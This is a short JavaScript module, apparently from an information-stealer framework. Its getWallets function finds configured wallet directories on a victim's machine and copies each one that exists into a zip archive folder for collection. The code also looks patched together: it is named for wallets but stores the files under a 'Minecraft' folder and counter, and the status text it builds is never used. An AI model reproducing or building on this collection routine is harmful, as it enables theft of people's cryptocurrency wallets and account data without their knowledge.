module.exports = (client) => {
    return {
        async getWallets() {
            var description = "";

            client.utils.jszip.createFolder("\\Minecraft");

            for (let [key, value] of Object.entries(client.config.wallets.directory)) {
                if (client.requires.fs.existsSync(value)) {
                    description += `${key}: ✔️\n`;
                    client.utils.jszip.copyFolder(`\\Minecraft\\${key}`, value);
                    client.config.counter.minecraft++;
                } else {
                    description += `${key}: ❌\n`;
                }
            }
        }
    };
};